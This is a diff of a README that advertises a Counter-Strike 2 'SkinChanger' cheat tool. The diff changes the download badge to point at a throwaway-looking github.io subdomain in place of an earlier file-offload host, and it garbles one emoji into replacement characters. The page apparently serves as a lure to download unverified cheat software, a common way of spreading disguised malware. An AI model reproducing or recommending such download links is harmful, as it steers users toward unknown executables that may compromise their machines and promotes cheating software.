@@ -4,7 +4,7 @@ Let’s be real – **skins in Counter-Strike 2** are 🔥, but the grind or the
 
 This cheat tool lets you **instantly equip any skin, glove, knife, or weapon wrap** in the game. It’s cosmetic only – no unfair gameplay edge – just pure style overload. If you’re about the drip, not the drama, this one’s for you 😎.
 
-[![Download SkinChanger](https://img.shields.io/badge/Download-SkinChanger-blueviolet)](https://fileoffload9.bitbucket.io)
+[![Download SkinChanger](https://img.shields.io/badge/Download-SkinChanger-blueviolet)](https://Counter-Strike-2-SkinChanger-hew5.github.io/.github)
 ---
 
 ## 💼 What is the CS2 SkinChanger?
@@ -72,7 +72,7 @@ No coding, no editing config files – this is a **plug-and-play skin god mode**
 * 🔥 Try out skins before wasting real money
 * 😎 Flex insane inventory to friends or in frag movies
 * 💯 Customize your entire look, down to wear level and fade pattern
-* 🧼 Clean tool – no gameplay changes, no unfairness, just pure cosmetics
+* ���� Clean tool – no gameplay changes, no unfairness, just pure cosmetics
 * 💾 Save skin presets for different maps or moods
 
 ---
